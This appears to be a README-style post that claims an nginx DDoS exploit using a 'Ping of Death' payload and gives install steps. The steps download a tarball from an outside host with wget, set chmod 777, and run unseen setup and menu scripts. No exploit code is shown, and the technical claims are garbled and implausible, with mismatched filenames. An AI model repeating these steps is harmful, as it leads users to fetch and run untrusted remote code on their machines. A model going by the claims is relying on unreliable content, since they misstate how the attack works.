           _   _  _____ _____ _   ___   __                        
          | \ | |/ ____|_   _| \ | \ \ / /                        
  ______  |  \| | |  __  | | |  \| |\ V /   ______                
 |______| | | | | | |_ | | | | | | | > <   |______|               
          | |\  | |__| |_| |_| |\  |/ | \                         
          |_|_\_|\_____|_____|_| \_/_/ \_\                        
          |  __ \ / __ \ / ____|                                  
  ______  | |  | | |  | | (___    ______                          
 |______| | |  | | |  | |\___ \  |______|                         
          | |__| | |__| |____) |                                  
          |_____/_\____/|_____/_      ____ _____ _______          
          |  ____\ \ / /  __ \| |    / __ \_   _|__   __|         
  ______  | |__   \ V /| |__) | |   | |  | || |    | |     ______ 
 |______| |  __|   > < |  ___/| |   | |  | || |    | |    |______|
          | |____ / | \| |    | |___| |__| || |_   | |            
          |______/_/ \_\_|    |______\____/_____|  |_|            
                                                                  
                                                                  
I welcome you to the nginx exploit that I've discovered. This will be the PoC//Proof of Concept & installation guide.
Yes we all know what nginx is, We've seen it on a web-server before maybe even just browsing the web.
It is literally everywhere, The exploit consists of their handlers for scripts,
Their was exactly five i found that was interesting, 
One of them was one that would act as of ping-back exploits for DDoSing, 
but the one I'm showing you guys is one that was hitting at 200GB/s with 2,000 exploited nginx boxes, 
& it consists of using a a "PoD" aka "Ping of Death" i mentioned this in some of my other tweets, 
Now you're think, well do you have to look for older versions of Windows & Linux devices that can preform the "PoD." 
My response is, No, The exploit I've found is will use it's payload to run the "PoD" exploit, 
The "PoD" exploit i discovered will remain private due to misuse of it, 
If you want to ask more questions please feel free to ask me them on twitter @codingplanets 

           _____ _   _  _____ _______       _      _                
          |_   _| \ | |/ ____|__   __|/\   | |    | |               
  ______    | | |  \| | (___    | |  /  \  | |    | |       ______  
 |______|   | | | . ` |\___ \   | | / /\ \ | |    | |      |______| 
           _| |_| |\  |____) |  | |/ ____ \| |____| |____           
          |_____|_| \_|_____/   |_/_/    \_\______|______|          
                                                                    
                                                                    
             #1.)  wget http://fuck.com/lol.tar.gz
			 #2.)  tar zxvf NGINXExploit.tar.gz
			 #3.)  cd NGINX
			 #4.)  chmod 777 *
			 #5.)  ./setup
			 
			      /!\ IMPORTANT /!\
			 #6.)  If no directory error occurs copy & paste;
			        sed -i -e 's/\r$//' setup; sed -i -e 's/\r$//' menu; sed -i -e 's/\r$//' installed
______________________________________________________________________________________________________________________

			 #7.)  ./menu
